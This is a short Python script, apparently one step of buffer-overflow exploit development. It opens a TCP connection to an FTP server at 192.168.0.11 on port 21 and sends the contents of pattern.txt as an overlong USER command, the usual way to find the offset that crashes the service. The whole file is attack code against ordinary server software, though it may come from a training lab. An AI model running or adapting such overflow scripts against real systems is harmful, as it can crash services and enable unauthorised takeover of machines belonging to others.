import socket

pattern = open("pattern.txt", "rb")
buffer = pattern.read()
pattern.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.0.11", 21))
s.send(b'USER ' + buffer  + b'\r\n')